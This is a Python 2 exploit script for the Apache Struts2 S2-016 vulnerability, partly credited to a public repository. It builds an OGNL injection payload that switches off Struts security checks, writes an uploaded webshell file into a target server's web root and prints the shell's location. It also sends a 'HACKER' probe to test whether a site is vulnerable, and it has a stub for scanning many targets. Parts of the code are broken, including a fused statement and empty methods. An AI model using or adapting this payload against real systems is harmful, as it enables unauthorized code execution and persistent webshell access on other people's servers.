#!/usr/bin/env python
# encoding: utf-8

import requests
import os
import sys
sys.path.append('../')
import re
from optparse import OptionParser
import threading
from Queue import Queue
import time


from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.exception import PocsuiteThreadException


class Struts2(object):

    def __init__(self):
        pass


    def struts_005(self):
        pass


    def _struts_016_poc(self):
        pass


    def _struts_016_exp(self):
        pass

    def _struts_016_getshell(self):
        pass

    def struts_016(self, url):

        self._struts_016_poc(url)


    def struts_019(self):
        pass


    def struts_032(self):
        pass



""" most from https://github.com/OneSourceCat/s2-016-exp"""
class Struts_016():

    '''constructor'''
    def __init__(self,filepath,shellname):

        self.filepath = filepath
        self.shellname = shellname f = open(self.filepath,'r')
        self.payload = '''redirect:${{%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%5d%2c%23b%3dnew+java.io.FileOutputStream(new+java.lang.StringBuilder(%23a.getRealPath(%22/%22)).append(@java.io.File@separator).append(%22{shellname}%22))%2c%23b.write(%23a.getParameter("t").getBytes())%2c%23b.close%28%29%2c%23p%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.getWriter%28%29%2c%23p.println%28%22DONE%22%29%2c%23p.flush%28%29%2c%23p.close%28%29}}'''.format(shellname=self.shellname)
        self.detect_str = '''redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22HACKER%22),%23p.close()}'''
        self.webshell = f.read()
        f.close()

    '''获取shell的URL'''
    def getShellPath(self,url):
        rawurl = url
        url = url.replace('http://', '')
        url = url.replace('https://', '')
        split_url = url.split('/')
        shell_path = ''
        if len(split_url) > 2:
            shell_path = split_url[0] + '/' + split_url[1]
        else:
            shell_path = split_url[0]
        return rawurl.split('//')[0] + '//' + shell_path + self.shellname


    '''检测是否存在漏洞'''
    def detect(self,url):
        url = "%s?%s" % (url,self.detect_str)
        try:
            r = requests.get(url,timeout=10)
            page_content = r.content
            if page_content.find('HACKER') != -1:
                return True
            else:
                return False
        except Exception, e:
            print '[+]Exploit Failed:',e
            return False


    '''攻击 上传shell到根目录'''
    def getshell(self,url):
        target_url = "%s?%s" % (url,self.payload)
        data = {'t':self.webshell}
        try:
            r = requests.post(target_url,data=data,timeout=10)
            page_content = r.content
            if page_content.find('DONE') != -1:
                print '[+]Exploit Success,shell location: %s' % self.getShellPath(url)
            else:
                print '[+]Exploit Failed'
        except Exception, e:
            print '[+]Exploit Failed:',e
            return


def main(thread_nums, url, domain, dirs):

    struts = Struts()

    if url is not None:
        pass

    if domain is not None:
        for d in open('dirs'):
            url = 'http://{domain}{dir_str}'.format(
                                               domain=domain,
                                               dir_str=d)
            struts.struts_016(url)



if __name__ == '__main__':
    os.system('clear')

    """
    default threads is 1

    if url(-u) is used, then url is only one url, else then read urls.txt from current directory
    if domain(-d) is used, then dirs(-f) should be used, default dirs files is dirs.txt

    eg:
    1. python struts2.py -u http://example.com/xx.action
    2. python strutsw.py -t 10 -d example.com -f dirs2.txt
    """

    parser = OptionParser()
    parser.add_option("-t", "--threads",
                      dest="thread_nums",
                      type="int",
                      help="Number of threads")
    parser.add_option("-u", "--url",
                      dest="url",
                      type="string",
                      help="Checking url")
    parser.add_option("-d", "--domain",
                      dest="domain",
                      type="string",
                      help="Checking domain")
    parser.add_option("-f", "--dirs",
                      dest="dirs",
                      type="string",
                      help="Checking directorys")

    main(parser.thread_nums, parser.url,
         parser.domain, parser.dirs)

    if len(sys.argv) != 4:
        print '[+]Usage:python s2-016.py [target_url] [filename at your mechine] [shellname at remote host]'
        print '[+]Eg:python s2-016.py www.foo.com webshell.jsp system.jsp'
        sys.exit()

    url = sys.argv[1]
    filename = sys.argv[2]
    shellname = sys.argv[3]

    if not url.startswith('http://'):
        print '[+]URL is invalid!'
        sys.exit()

    print '[+]Target:%s' % url
    attacker = Struts_016(filename,shellname)

    if attacker.detect(url):
       print '[+]This website is vulnerable!'
    else:
       print '[+]Sorry,exploit failed!'
       sys.exit()
    attacker.getshell(url)
